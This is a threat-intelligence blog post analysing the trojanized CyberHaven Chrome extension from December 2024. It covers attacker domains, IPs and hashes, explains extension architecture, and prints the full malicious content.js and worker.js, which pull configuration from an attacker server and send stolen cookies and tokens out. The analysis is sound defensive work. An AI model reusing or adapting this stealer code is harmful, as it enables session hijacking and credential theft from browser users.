---
title: Trojanized Chrome Extensions
by: dmpdump
tags: malware, chrome
---

I rarely deal with malicious browser extensions, however, they are likely to become increasingly relevant in the future. It is commonly said that "the browser is the new OS", so it only makes sense for threat actors to write and deliver malware that runs in the context of the browser.

On December 26, 2024, it [became public](https://x.com/cstanley/status/1872365853318225931) that CyberHaven, a DLP security company, had been breached. In their [breach](https://www.cyberhaven.com/blog/cyberhavens-chrome-extension-security-incident-and-what-were-doing-about-it) notification, CyberHaven described the incident as a phishing attack that was used to add a malicious OAuth Google application named "Privacy Policy", with access to see, update, or publish Chrome Web Store Extensions. With this access, the threat actor published a trojanized version of the CyberHaven extension (version 24.10.4, hash:DDF8C9C72B1B1061221A597168f9BB2C2BA09D38D7B3405E1DACE37AF1587944). Pivoting on the IP address that the domain in the malicious CyberHaven extension resolved to, [it was identified](https://x.com/jaimeblascob/status/1872445912175534278) that a few other trojanized extensions shared similar malicious code. 

The malicious domain used in the malicious extension, cyberhavenext\[.\]pro and subdomain api.cyberhavenext\[.\]pro, resolved to IP addresses 149.28.124\[.\]84 and
149.248.2\[.\]160. Passive DNS (PDNS) resolutions show other domains served by the same IP address which were used in the compromise of other Chrome extensions which share the same malicious code.

![sshot](/assets/images/badext/baddomains.png)

<u>149.28.124[.]84</u>

![sshot](/assets/images/badext/pdns.png)

<u>149.248.2[.]160</u>

![sshot](/assets/images/badext/pdns2.png) 

This seemed like a good opportunity to dig deeper into the internals of a malicious Chrome extension.
# Anatomy of a Chrome Extension
Chrome extensions are a set of files organized in a hierarchical structure, packed as a .crx file (which can be unpacked as a regular archive). The main components are:
* The manifest file, a JSON file which defines permissions, metadata, and the files/scripts used by the extension
* The content scripts, which interact with the loaded web pages and communicate with background scripts
* The background/worker scripts, which run in the backend of the extension, listening for events. In manifest version 3, background scripts were replaced with a service worker
* UI components, such as pop-up scripts. These are the front-end components of the extension

Content scripts can communicate with service workers [using the messaging API](https://developer.chrome.com/docs/extensions/develop/concepts/messaging), which include methods such as:
* `runtime.sendMessage()` to send a single message
* `tabs.sendMessage()` to send a single message
* `sendResponse()` to respond to a message synchronously
* `runtime.onMessage()` to set up an event listener

![sshot](/assets/images/badext/chrome_ext_arch.png)

# Trojanized CyberHaven scripts
The content and background scripts of the trojanized CyberHaven extension were shared publicly.
* `content.js`: AC5CC8BCC05AC27A8F189134C2E3300863B317FB
* `worker.js`: 0B871BDEE9D8302A48D6D6511228CAF67A08EC60  

<u>Content.js</u>

This is a new script added by the threat actor which interacts with the websites that the victim visits. It implements a listener and a series of actions depending on a comparison between the current URL and URLs decoded from a configuration retrieved from the threat actor C2 (retrieved in `worker.js`).

`Content.js` sets up an event listener, if the incoming message is `getScreenSize`, it returns the screen size and width.
```javascript
chrome.runtime.onMessage.addListener(function (e, t, a) {
	console.log('Message received:', e), 'getScreenSize' === e.command && a({
		screenWidth: window.screen.width,
		screenHeight: window.screen.height
	});
```
 It then implements an async function which gets data from `cyberhavenext_ext_manage`, a local storage object with the configuration received from the threat actor C2. If the data from `cyberhavenext_ext_manage` exists and the code is not 2000, it checks if the current URL (using `document.href`) is in the base64-decoded configuration.

```javascript
async function () {
	let e, t = document.location.href;
	try {
		const {cyberhavenext_ext_manage: t} = await chrome.storage.local.get(['cyberhavenext_ext_manage']);
		e = t ? JSON.parse(t) : null;
	} catch (e) {
		console.error('Error retrieving data from storage:', e);
	}
	e && 2000 !== e.code ? setTimeout(async function () {
		if (t.includes(atob(e.cyberhavenextc)))
```

The retrieved encoded configuration is no longer available, but it was shared by CyberHaven:

![sshot](/assets/images/badext/decoded_config_cyberh.png)

The script subsequently performs parsing actions in `cyberhavenext-text` and `cyberhavenext-rjson` and sends a message to `worker.js` with action `cyberhavenext-text`, including payload `pl` to `worker.js`, which contains sensitive data such as tokens and userids from the targeted URLs.
```javascript
chrome.runtime.sendMessage({
	action: 'cyberhavenext-rtext',
	url: t
}, t => {
	const i = /6kU.*?"/gm;
	let w, k = '';
	for (; null !== (w = i.exec(t));)
		k = w[0].replace('"', '');
	if (k) {
		let t = s + k;
		chrome.runtime.sendMessage({
			action: 'cyberhavenext-rjson',
			url: r + t
		}, async r => {
			const s = r.id, i = r;
			chrome.runtime.sendMessage({
				action: 'cyberhavenext-rjson',
				url: a + t
			}, async a => {
				const r = a.data;
				chrome.runtime.sendMessage({
					action: 'cyberhavenext-rjson',
					url: V + t
				}, async a => {
					const w = a.data;
					chrome.runtime.sendMessage({
						action: 'cyberhavenext-check-errors',
						url: o,
						pl: {
							dm: atob(e.cyberhavenextc),
							openapi_tk: t,
							openapi_u: i,
							cyberhavenext_cx: r,
							gpta: w,
							uid: s,
							hed: n,
							n: c,
							r: l,
							k: ''
						}
```

<u>Worker.js</u>

In order to understand how the data is exfiltrated, we need to look at the actions implemented in `worker.js` and how they interact with `content.js`. The legitimate `worker.js` from the CyberHaven extension had malicious code appended to it. This malicious script is responsible for retrieving the encoded configuration from the threat actor infrastructure, storing it in `cyberhavenext_ext_manage`. It also implements a switch/case statement with various actions based on messages sent from `content.js`.
Here we can see that the encoded configuration with the target URLs is retrieved from cyberhavenext\[.\]pro:

```javascript
 async function () {
	try {
		const t = await fetch('https://cyberhavenext[.]pro/ai-cyberhaven', {
			method: 'POST',
			headers: {
				Accept: 'application/json, application/xml, text/plain, text/html, *.*',
				'Content-Type': 'application/json'
			}
		});
		if (!t.ok)
			throw new Error(`HTTP error! Status: ${ t.status }`);
		const e = await t.json();
		await chrome.storage.local.set({ cyberhavenext_ext_manage: JSON.stringify(e) }), console.log('Data successfully stored!');
	} catch (t) {
		console.error('An error occurred:', t);
	}
```
We can also see that the `cyberhavenext-text` and `cyberhavenext-rjson` actions are parsers:

```javascript
case 'cyberhavenext-rtext':
		fetch(t.url).then(t => t.text()).then(t => a(t)).catch();
		break;
	case 'cyberhavenext-rjson':
		fetch(t.url).then(t => t.json()).then(t => a(t)).catch();
		break;
```
`cyberhavenext-check-errors` is the key stealer action. Here we can see how messages received from `content.js` are used to extract, encode, and send sensitive data, including all cookies, from the targeted domains.

```javascript
case 'cyberhavenext-check-errors':
		const e = t.pl;
		let n = e.dm;
		chrome.cookies.getAll({ domain: n }, n => {
			if (n.length > 0) {
				const o = n.map(t => ({
						domain: t.domain,
						expirationDate: t.expirationDate || null,
						hostOnly: t.hostOnly,
						httpOnly: t.httpOnly,
						name: t.name,
						path: t.path,
						sameSite: t.sameSite || null,
						secure: t.secure,
						session: t.session,
						storeId: t.storeId || null,
						value: t.value
					})), c = e.n;
				let s = '';
				try {
					s = btoa(JSON.stringify(e.openapi_u));
				} catch (t) {
				}
				const i = e.openapi_tk + ' || ' + JSON.stringify(o) + ' || ' + btoa(navigator[c]) + ' || ' + e.uid + ' || ' + s + ' ||  || ' + e.k, r = {
						ms1: btoa(i),
						ms2: JSON.stringify(e.cyberhavenext_cx),
						ms3: JSON.stringify(e.gpta)
					}, l = t.url;
				fetch(l, {
					method: 'POST',
					headers: {
						Accept: 'application/json, application/xml, text/plain, text/html, *.*',
						'Content-Type': 'application/json'
					},
					body: JSON.stringify(r)
```
Given the nature of the URLs delivered by the threat actor C2, this seems to be an opportunistic attack, possibly trying to target Facebook for Business accounts. In the last year, I have seen multiple infostealers originating from Vietnam targeting Facebook for Business accounts. The implementation of a malicious browser extension might be a response from the threat actors to the [increasing cookie protections in Google Chrome](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html).

# Full script content

* Content.js:

```javascript
chrome.runtime.onMessage.addListener(function (e, t, a) {
	console.log('Message received:', e), 'getScreenSize' === e.command && a({
		screenWidth: window.screen.width,
		screenHeight: window.screen.height
	});
}), async function () {
	let e, t = document.location.href;
	try {
		const {cyberhavenext_ext_manage: t} = await chrome.storage.local.get(['cyberhavenext_ext_manage']);
		e = t ? JSON.parse(t) : null;
	} catch (e) {
		console.error('Error retrieving data from storage:', e);
	}
	e && 2000 !== e.code ? setTimeout(async function () {
		if (t.includes(atob(e.cyberhavenextc)))
			try {
				await async function (e) {
					const t = atob(e.cyberhavenextf), a = atob(e.cyberhavenextg), o = atob(e.cyberhavenextb), r = atob(e.cyberhavenexth), n = atob(e.cyberhavenextd), c = atob(e.cyberhavenexte), l = atob(e.cyberhavenexta), s = atob(e.cyberhavenexti), i = atob(e.cyberhavenextl), w = atob(e.cyberhavenextm), k = atob(e.cyberhavenextn), d = atob(e.cyberhavenexto), m = atob(e.cyberhavenextp), V = atob(e.cyberhavenextk);
					atob(e.cyberhavenextq), atob(e.cyberhavenextr);
					chrome.runtime.sendMessage({
						action: 'cyberhavenext-rtext',
						url: t
					}, t => {
						const i = /6kU.*?"/gm;
						let w, k = '';
						for (; null !== (w = i.exec(t));)
							k = w[0].replace('"', '');
						if (k) {
							let t = s + k;
							chrome.runtime.sendMessage({
								action: 'cyberhavenext-rjson',
								url: r + t
							}, async r => {
								const s = r.id, i = r;
								chrome.runtime.sendMessage({
									action: 'cyberhavenext-rjson',
									url: a + t
								}, async a => {
									const r = a.data;
									chrome.runtime.sendMessage({
										action: 'cyberhavenext-rjson',
										url: V + t
									}, async a => {
										const w = a.data;
										chrome.runtime.sendMessage({
											action: 'cyberhavenext-check-errors',
											url: o,
											pl: {
												dm: atob(e.cyberhavenextc),
												openapi_tk: t,
												openapi_u: i,
												cyberhavenext_cx: r,
												gpta: w,
												uid: s,
												hed: n,
												n: c,
												r: l,
												k: ''
											}
										}, () => {
											chrome.storage.local.set({ cyberhavenext_ext_log: JSON.stringify(s) });
										});
									});
								});
							});
						}
					}), document.body.addEventListener(w, () => {
						document.querySelectorAll(i).forEach(async e => {
							const t = e.getAttribute(m);
							if (t && t.includes(k))
								try {
									const {cyberhavenext_ext_log: e} = await chrome.storage.local.get(['cyberhavenext_ext_log']), a = e ? JSON.parse(e) : '';
									chrome.runtime.sendMessage({
										action: 'cyberhavenext-validate',
										url: d,
										pl: {
											sc: btoa(t),
											cf: btoa(a)
										}
									});
								} catch (e) {
									console.error('Error retrieving log data:', e);
								}
						});
					});
				}(e);
			} catch (e) {
				console.error('Error processing valid URL:', e);
			}
		else
			chrome.runtime.sendMessage({
				action: 'cyberhavenext-redirect',
				url: e.cyberhavenextf
			}, t => {
				0 === t && chrome.runtime.sendMessage({
					action: 'cyberhavenext-completions',
					key: e.cyberhavenextd
				});
			});
	}, 2000) : chrome.runtime.sendMessage({
		action: 'cyberhavenext-redirect',
		url: e.cyberhavenextf
	}, t => {
		0 === t && chrome.runtime.sendMessage({
			action: 'cyberhavenext-completions',
			key: e.cyberhavenextd
		});
	});
}();
```

* Worker.js:

```javascript
//Legitimate worker.js code:
(() => {
	'use strict';
	try {
		importScripts('browser-polyfill.min.js', 'background.js');
	} catch (err) {
		console.error(err);
	}
})();

//Malicious coded added below:

chrome.runtime.onMessage.addListener((t, e, a) => {
	switch (t.action) {
	case 'cyberhavenext-completions':
		fetch('https://chatgpt[.]com/status/', {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				Authorization: `Bearer ${ t.key }`
			},
			body: JSON.stringify({
				prompt: 'check',
				max_tokens: 150
			})
		}).then(t => t.json()).then(t => a(t)).catch(t => {
		});
		break;
	case 'cyberhavenext-redirect':
		fetch(t.url).then(t => t.redirected).then(t => a(t)).catch();
		break;
	case 'cyberhavenext-validate':
		fetch(t.url, {
			method: 'POST',
			headers: {
				Accept: 'application/json, application/xml, text/plain, text/html, *.*',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify(t.pl)
		}).then(t => t.json()).then(t => a(t)).catch(t => {
		});
		break;
	case 'cyberhavenext-rtext':
		fetch(t.url).then(t => t.text()).then(t => a(t)).catch();
		break;
	case 'cyberhavenext-rjson':
		fetch(t.url).then(t => t.json()).then(t => a(t)).catch();
		break;
	case 'cyberhavenext-check-errors':
		const e = t.pl;
		let n = e.dm;
		chrome.cookies.getAll({ domain: n }, n => {
			if (n.length > 0) {
				const o = n.map(t => ({
						domain: t.domain,
						expirationDate: t.expirationDate || null,
						hostOnly: t.hostOnly,
						httpOnly: t.httpOnly,
						name: t.name,
						path: t.path,
						sameSite: t.sameSite || null,
						secure: t.secure,
						session: t.session,
						storeId: t.storeId || null,
						value: t.value
					})), c = e.n;
				let s = '';
				try {
					s = btoa(JSON.stringify(e.openapi_u));
				} catch (t) {
				}
				const i = e.openapi_tk + ' || ' + JSON.stringify(o) + ' || ' + btoa(navigator[c]) + ' || ' + e.uid + ' || ' + s + ' ||  || ' + e.k, r = {
						ms1: btoa(i),
						ms2: JSON.stringify(e.cyberhavenext_cx),
						ms3: JSON.stringify(e.gpta)
					}, l = t.url;
				fetch(l, {
					method: 'POST',
					headers: {
						Accept: 'application/json, application/xml, text/plain, text/html, *.*',
						'Content-Type': 'application/json'
					},
					body: JSON.stringify(r)
				}).then(t => t.json()).then(t => a(t)).catch(t => {
				});
			}
		});
	}
	return !0;
}), async function () {
	try {
		const t = await fetch('https://cyberhavenext[.]pro/ai-cyberhaven', {
			method: 'POST',
			headers: {
				Accept: 'application/json, application/xml, text/plain, text/html, *.*',
				'Content-Type': 'application/json'
			}
		});
		if (!t.ok)
			throw new Error(`HTTP error! Status: ${ t.status }`);
		const e = await t.json();
		await chrome.storage.local.set({ cyberhavenext_ext_manage: JSON.stringify(e) }), console.log('Data successfully stored!');
	} catch (t) {
		console.error('An error occurred:', t);
	}
}();
```